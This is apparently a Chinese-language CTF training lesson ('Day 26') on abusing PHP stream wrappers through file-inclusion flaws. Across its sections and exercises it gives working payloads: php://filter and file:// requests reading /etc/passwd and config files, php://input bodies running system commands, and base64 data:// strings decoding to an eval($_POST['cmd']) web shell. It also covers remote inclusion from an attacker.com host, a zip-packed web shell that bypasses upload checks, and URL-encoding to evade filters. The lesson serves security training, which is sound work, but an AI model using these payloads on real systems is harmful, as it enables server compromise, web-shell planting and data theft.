# Day 26：PHP伪协议详解——深入理解与实战应用

> **学习目标**：深入理解PHP伪协议的原理和用法，掌握各种伪协议在CTF中的应用
> 
> **学习时长**：2小时
> 
> **难度等级**：⭐⭐⭐⭐⭐

---

## 📚 今日内容概览

1. PHP伪协议概述
2. 常用伪协议详解
3. 伪协议在CTF中的应用
4. 实战练习
5. 总结与建议

---

## 一、PHP伪协议概述

### 1.1 什么是PHP伪协议

```
PHP伪协议是什么：
  PHP支持的特殊协议
  用于访问各种资源
  如文件、网络、数据流等

特点：
  - 以协议://开头
  - 可以在文件操作函数中使用
  - 提供了访问不同资源的统一接口

常用伪协议：
  - file://：访问本地文件系统
  - http://：访问HTTP资源
  - https://：访问HTTPS资源
  - ftp://：访问FTP资源
  - php://：访问PHP内部流
  - data://：访问数据
  - glob://：匹配文件路径
  - phar://：访问PHAR文件
```

### 1.2 伪协议的用途

```
用途：
  1. 文件操作：读取、写入、包含文件
  2. 网络操作：访问远程资源
  3. 数据流操作：处理输入输出流
  4. 代码执行：执行PHP代码
  
在CTF中的应用：
  - 绕过文件包含限制
  - 读取敏感文件
  - 执行恶意代码
  - 绕过安全防护
```

---

## 二、常用伪协议详解

### 2.1 file://协议

```
file://协议：
  访问本地文件系统
  
语法：
  file://文件路径
  
示例：
  file:///etc/passwd
  file://C:\Windows\system32\drivers\etc\hosts
  
在文件包含中的使用：
  ?file=file:///etc/passwd
  直接访问本地文件
  
特点：
  - 需要绝对路径
  - 可以访问系统文件
```

### 2.2 php://协议

```
php://协议：
  访问PHP内部流
  
常用子协议：
  - php://stdin：标准输入
  - php://stdout：标准输出
  - php://stderr：标准错误
  - php://input：读取POST数据
  - php://filter：过滤处理
  - php://memory：内存流
  - php://temp：临时文件流
  
在CTF中的应用：
  - php://input：执行POST数据中的PHP代码
  - php://filter：读取文件内容（Base64编码）
```

#### 2.2.1 php://input

```
php://input：
  读取POST请求的原始数据
  
使用方法：
  1. 设置文件包含参数为php://input
  2. 在POST数据中发送PHP代码
  3. 代码会被执行
  
示例：
  URL：http://example.com/index.php?file=php://input
  POST数据：<?php system('ls'); ?>
  
条件：
  - allow_url_include = On（某些PHP版本不需要）
  - 需要POST请求
  
优点：
  - 不需要上传文件
  - 直接执行代码
```

#### 2.2.2 php://filter

```
php://filter：
  对文件内容进行过滤处理
  
语法：
  php://filter/[过滤器]/resource=文件路径
  
常用过滤器：
  - convert.base64-encode：Base64编码
  - convert.base64-decode：Base64解码
  - convert.quoted-printable-encode：Quoted-Printable编码
  - string.rot13：ROT13编码
  - string.toupper：转大写
  - string.tolower：转小写
  
示例：
  读取文件的Base64编码内容：
  ?file=php://filter/convert.base64-encode/resource=index.php
  
  读取原始文件内容：
  ?file=php://filter/read=convert.base64-encode/resource=index.php
  
特点：
  - 可以绕过某些文件包含限制
  - 读取文件内容而不执行
```

### 2.3 data://协议

```
data://协议：
  直接访问数据
  
语法：
  data://[mediatype][;base64],数据
  
示例：
  data://text/plain,Hello World
  data://text/plain;base64,SGVsbG8gV29ybGQ=
  
在CTF中的应用：
  ?file=data://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTsgPz4=
  解码后：<?php eval($_POST['cmd']); ?>
  
条件：
  - allow_url_include = On
  - allow_url_fopen = On
  
优点：
  - 不需要上传文件
  - 直接执行代码
```

### 2.4 http:// 和 https:// 协议

```
http:// 和 https:// 协议：
  访问远程HTTP/HTTPS资源
  
语法：
  http://网址
  https://网址
  
在CTF中的应用：
  ?file=http://attacker.com/shell.php
  
条件：
  - allow_url_include = On
  - allow_url_fopen = On
  
优点：
  - 可以远程包含恶意代码
  - 灵活方便
  
缺点：
  - 需要攻击者有自己的服务器
  - 容易被检测
```

### 2.5 phar://协议

```
phar://协议：
  访问PHAR文件（PHP归档文件）
  
语法：
  phar://文件路径/内部路径
  
示例：
  phar:///path/to/file.phar/index.php
  
在CTF中的应用：
  1. 创建一个PHAR文件，包含恶意代码
  2. 通过文件包含漏洞包含该文件
  3. 恶意代码被执行
  
特点：
  - 需要PHP支持PHAR
  - 可以绕过某些文件类型限制
```

### 2.6 zip://协议

```
zip://协议：
  访问ZIP压缩文件中的内容
  
语法：
  zip://文件路径#内部文件路径
  
示例：
  zip:///path/to/file.zip#shell.php
  
在CTF中的应用：
  1. 创建一个ZIP文件，包含恶意PHP文件
  2. 上传ZIP文件
  3. 通过文件包含漏洞包含ZIP文件中的PHP文件
  4. 恶意代码被执行
  
条件：
  - PHP版本支持zip://协议
  - 需要知道ZIP文件的路径
  
优点：
  - 可以绕过文件上传限制
  - 隐藏恶意代码
```

### 2.7 glob://协议

```
glob://协议：
  匹配文件路径
  
语法：
  glob://模式
  
示例：
  glob:///var/www/*.php
  
在CTF中的应用：
  - 列出目录中的文件
  - 查找敏感文件
  
特点：
  - 返回文件路径列表
  - 不能读取文件内容
```

---

## 三、伪协议在CTF中的应用

### 3.1 绕过文件包含限制

```
场景：
  服务器只允许包含特定扩展名的文件
  
方法：
  1. 使用php://filter读取文件内容
  2. 使用data://协议执行代码
  3. 使用phar://或zip://绕过扩展名限制
  
示例：
  目标代码：
  <?php include($_GET['file'] . '.php'); ?>
  
  绕过方法1：
  ?file=php://filter/convert.base64-encode/resource=../../etc/passwd
  
  绕过方法2：
  ?file=data://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTsg
  
  绕过方法3：
  ?file=zip:///path/to/file.zip#shell
```

### 3.2 读取敏感文件

```
场景：
  需要读取服务器上的敏感文件
  
方法：
  1. 使用file://协议直接读取
  2. 使用php://filter读取并编码
  
示例：
  读取/etc/passwd：
  ?file=file:///etc/passwd
  
  读取index.php（Base64编码）：
  ?file=php://filter/convert.base64-encode/resource=index.php
  
  读取配置文件：
  ?file=file:///var/www/html/config.php
```

### 3.3 执行恶意代码

```
场景：
  需要在服务器上执行PHP代码
  
方法：
  1. 使用php://input执行POST数据
  2. 使用data://协议执行Base64编码的代码
  3. 使用http://协议远程包含
  
示例：
  方法1（php://input）：
  URL：?file=php://input
  POST数据：<?php system('cat /flag'); ?>
  
  方法2（data://）：
  ?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgL2ZsYWcnKTsgPz4=
  
  方法3（http://）：
  ?file=http://attacker.com/shell.php
```

### 3.4 绕过文件上传限制

```
场景：
  服务器限制上传文件类型
  
方法：
  1. 创建ZIP文件包含恶意代码
  2. 使用zip://协议包含
  3. 代码被执行
  
示例：
  1. 创建shell.php文件：<?php eval($_POST['cmd']); ?>
  2. 压缩为shell.zip
  3. 上传shell.zip
  4. 通过文件包含漏洞包含：?file=zip:///path/to/shell.zip#shell.php
  5. 代码被执行
```

---

## 四、实战练习

### 4.1 练习1：使用php://filter读取文件

```
题目：
  URL：http://example.com/index.php?file=home
  目标：读取index.php的源代码

步骤：
  1. 测试php://filter：
     ?file=php://filter/convert.base64-encode/resource=index.php
  
  2. 获取Base64编码的内容：
     页面显示Base64编码的字符串
  
  3. 解码Base64：
     使用Base64解码工具解码
     获取index.php的源代码
  
  预期结果：
     获取index.php的完整源代码
```

### 4.2 练习2：使用php://input执行代码

```
题目：
  URL：http://example.com/index.php?file=home
  目标：执行系统命令

步骤：
  1. 设置文件包含参数为php://input：
     ?file=php://input
  
  2. 使用Burp发送POST请求：
     POST数据：<?php system('ls'); ?>
  
  3. 查看响应：
     页面显示目录内容
  
  4. 执行其他命令：
     POST数据：<?php system('cat /flag'); ?>
  
  预期结果：
     获取Flag
```

### 4.3 练习3：使用data://协议执行代码

```
题目：
  URL：http://example.com/index.php?file=home
  目标：执行PHP代码

步骤：
  1. 准备PHP代码：<?php eval($_POST['cmd']); ?>
  2. Base64编码：PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTsgPz4=
  3. 构造Payload：
     ?file=data://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTsgPz4=
  
  4. 发送请求：
     服务器会执行这段PHP代码
  
  5. 使用Burp发送POST请求：
     cmd=system('cat /flag');
  
  预期结果：
     获取Flag
```

### 4.4 练习4：使用zip://协议绕过限制

```
题目：
  URL：http://example.com/index.php?file=home
  目标：绕过文件上传限制

步骤：
  1. 创建PHP WebShell：shell.php
     内容：<?php eval($_POST['cmd']); ?>
  
  2. 压缩为shell.zip
  
  3. 上传shell.zip到服务器
  
  4. 确定上传路径（如/uploads/shell.zip）
  
  5. 构造Payload：
     ?file=zip:///var/www/html/uploads/shell.zip#shell.php
  
  6. 发送请求：
     服务器会包含ZIP文件中的shell.php
  
  7. 使用Burp发送POST请求：
     cmd=system('cat /flag');
  
  预期结果：
     获取Flag
```

---

## 五、常见问题解决

### 5.1 问题1：php://input无法使用

```
现象：
  使用php://input时没有执行代码
  
解决方法：
  1. 检查PHP配置：allow_url_include
  2. 确保使用POST请求
  3. 尝试其他伪协议（如data://）
  
示例：
  如果php://input不行，尝试data://协议
```

### 5.2 问题2：data://协议被过滤

```
现象：
  使用data://协议时被拦截
  
解决方法：
  1. 使用编码绕过：URL编码、双重编码
  2. 尝试其他协议（如http://）
  3. 使用zip://或phar://协议
  
示例：
  ?file=%64%61%74%61%3A%2F%2Ftext%2Fplain%3B%62%61%73%6536%34%2C...
```

### 5.3 问题3：zip://协议无法使用

```
现象：
  使用zip://协议时文件无法被包含
  
解决方法：
  1. 检查PHP版本是否支持zip://
  2. 确保ZIP文件路径正确
  3. 确保ZIP文件中有正确的文件
  
示例：
  检查ZIP文件内容：unzip -l shell.zip
```

---

## 六、今日总结

### 6.1 知识点回顾

```
✅ PHP伪协议概述
  - 定义和特点
  - 常用伪协议列表
  
✅ 常用伪协议详解
  - file://：访问本地文件
  - php://input：读取POST数据
  - php://filter：过滤处理
  - data://：访问数据
  - http:///https://：访问远程资源
  - phar://：访问PHAR文件
  - zip://：访问ZIP文件
  
✅ 伪协议在CTF中的应用
  - 绕过文件包含限制
  - 读取敏感文件
  - 执行恶意代码
  - 绕过文件上传限制
  
✅ 实战练习
  - 使用php://filter读取文件
  - 使用php://input执行代码
  - 使用data://协议执行代码
  - 使用zip://协议绕过限制
```

### 6.2 关键记忆点

```
记住这个口诀：

PHP伪协议真强大，各种资源都能抓；
file://读本地文件，php://input执行代码；
php://filter读源码，data://直接传数据；
zip://绕过上传限制，http://远程包含！

常用Payload：
  - 读取文件：php://filter/convert.base64-encode/resource=文件路径
  - 执行代码：php://input + POST数据
  - 执行代码：data://text/plain;base64,编码后的代码
```

### 6.3 今日作业

```
必做题：
  1. 练习使用php://filter读取文件
  2. 练习使用php://input执行代码
  3. 练习使用data://协议执行代码

选做题：
  1. 练习使用zip://协议绕过限制
  2. 研究phar://协议的用法
  3. 在CTFHub找相关题目练习

提交内容：
  - 步骤记录
  - 截图
  - 总结
```

### 6.4 明日预告

```
Day 27：文件上传实战

学习内容：
  - 文件上传漏洞实战
  - 综合利用方法
  - CTF题目练习
```

---

**恭喜你完成Day 26的学习！明天进行文件上传实战！** 🎉
